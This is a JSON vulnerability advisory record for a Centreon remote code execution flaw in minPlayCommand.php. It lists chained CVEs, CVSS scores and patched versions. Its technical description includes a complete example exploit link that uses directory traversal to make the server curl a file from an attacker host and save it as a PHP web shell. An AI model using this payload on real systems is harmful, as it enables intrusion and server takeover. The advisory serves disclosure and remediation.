{
    "source": "BDSA",
    "name": "BDSA-2020-0645",
    "title": "Centreon Vulnerable to Remote Code Execution (RCE) via 'minPlayCommand.php'",
    "description": "Centreon is vulnerable to remote code execution (RCE) through a malicious link clicked by an authenticated victim. This allows a remote unauthenticated attacker to execute arbitrary OS commands on the server with the privileges of the web host process.",
    "technicalDescription": "This vulnerability is enabled by two other vulnerabilities -  CVE-2019-19484 (BDSA-2020-0643) and CVE-2019-19486 (BDSA-2020-0644). In order to craft a malicious link an attacker would first use the hidden `p` parameter's open redirect vulnerability (CVE-2019-19484) to redirect the victim to `Plugin Test` page (page ID `60801`). This page accepts a `command_line` parameter - a string that gets executed as an OS command. Although `command_line` is highly sanitized in `configuration/configObject/command/minPlayCommand.php`, an attacker could use CVE-2019-19486 to perform a directory traversal attack and try to invoke arbitrary OS commands. Since the directory traversal attack involves inserting two single or double quotes in the exploit link, it also prevents function `escapeshellcmd` in `minPlayCommand.php` from escaping them (solely due to the way `escapeshellcmd` works by nature). This allows arbitrary command execution if the link is clicked by an authenticated user. An attacker could also twist the exploit so that once the link is clicked, their malicious php file is uploaded to the vulnerable host and they would be able access it without authentication to run arbitrary OS commands by themselves. \n\nA potential malicious link could look like this:\n\n`http://Targets_IP/centreon/index.php?`\n`p=60801%26command_line=$USER1$/.''./.''./.''./.''./.''./.''./bin/curl`\n`http://Attacker_IP/exploit.txt -o`\n`/usr/share/centreon/www/exploit.php%26o=p%26min=1`",
    "publishedDate": "2020-04-07T16:14:58.617Z",
    "updatedDate": "2020-04-07T16:14:58.610Z",
    "disclosureDate": "2020-01-11T00:00:00.000Z",
    "exploitPublishDate": "2020-01-11T00:00:00.000Z",
    "solution": "Fixed in:\n\n* [**19.04.5**](https://github.com/centreon/centreon/releases/tag/19.04.5) by [this](https://github.com/centreon/centreon/commit/c6f8309d596b5777c6e36735155e69c640044225) commit.\n* [**18.10.8**](https://github.com/centreon/centreon/releases/tag/18.10.8) by [this](https://github.com/centreon/centreon/commit/40ccfead2eb7547a29880311671480d174e526f1) commit.\n* [**2.8.30**](https://github.com/centreon/centreon/releases/tag/2.8.30) by [this](https://github.com/centreon/centreon/commit/172c0a81d5eb7c13aecb4cee91ed1ef185de84b3) commit.",
    "severity": "HIGH",
    "cvss2": {
        "baseScore": 6.8,
        "impactSubscore": 6.4,
        "exploitabilitySubscore": 8.6,
        "severity": "MEDIUM",
        "accessVector": "NETWORK",
        "accessComplexity": "MEDIUM",
        "authentication": "NONE",
        "confidentialityImpact": "PARTIAL",
        "integrityImpact": "PARTIAL",
        "availabilityImpact": "PARTIAL",
        "temporalMetrics": {
            "exploitability": "PROOF_OF_CONCEPT",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 5.3
        },
        "vector": "(AV:N/AC:M/Au:N/C:P/I:P/A:P/E:POC/RL:OF/RC:C)"
    },
    "cvss3": {
        "baseScore": 8.8,
        "impactSubscore": 5.9,
        "exploitabilitySubscore": 2.8,
        "severity": "HIGH",
        "attackVector": "NETWORK",
        "attackComplexity": "LOW",
        "confidentialityImpact": "HIGH",
        "integrityImpact": "HIGH",
        "availabilityImpact": "HIGH",
        "privilegesRequired": "NONE",
        "scope": "UNCHANGED",
        "userInteraction": "REQUIRED",
        "temporalMetrics": {
            "exploitability": "PROOF_OF_CONCEPT",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 7.9
        },
        "vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C"
    },
    "useCvss3": true,
    "classifications": [],
    "zeroDay": false,
    "underReview": false,
    "parentAdvisory": false,
    "workaround": "",
    "vendorFixDate": "2019-10-02T00:00:00.000Z",
    "bdsaTags": [
        "RCE"
    ],
    "overallScore": 7.9,
    "_meta": {
        "allow": [
            "GET"
        ],
        "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2020-0645",
        "links": [
            {
                "rel": "cwes",
                "href": "https://trendmicro2.app.blackduck.com/api/cwes/CWE-78"
            },
            {
                "rel": "related-vulnerability",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/CVE-2019-19487",
                "label": "NVD"
            },
            {
                "rel": "bdsa-ranges",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2020-0645/ranges"
            },
            {
                "rel": "reference",
                "href": "https://github.com/centreon/centreon/commit/172c0a81d5eb7c13aecb4cee91ed1ef185de84b3",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/centreon/centreon/commit/40ccfead2eb7547a29880311671480d174e526f1",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/centreon/centreon/commit/c6f8309d596b5777c6e36735155e69c640044225",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/centreon/centreon/releases/tag/18.10.8",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/centreon/centreon/releases/tag/19.04.5",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/centreon/centreon/releases/tag/2.8.30",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://medium.com/@mucomplex/undisclosed-cve-2019-19484-cve-2019-19486-cve-2019-19487-b46b97c930cd",
                "label": "ADVISORY"
            },
            {
                "rel": "reference",
                "href": "https://medium.com/@mucomplex/undisclosed-cve-2019-19484-cve-2019-19486-cve-2019-19487-b46b97c930cd",
                "label": "POC"
            },
            {
                "rel": "default-remediation-status",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2020-0645/default-remediation-status"
            }
        ]
    }
}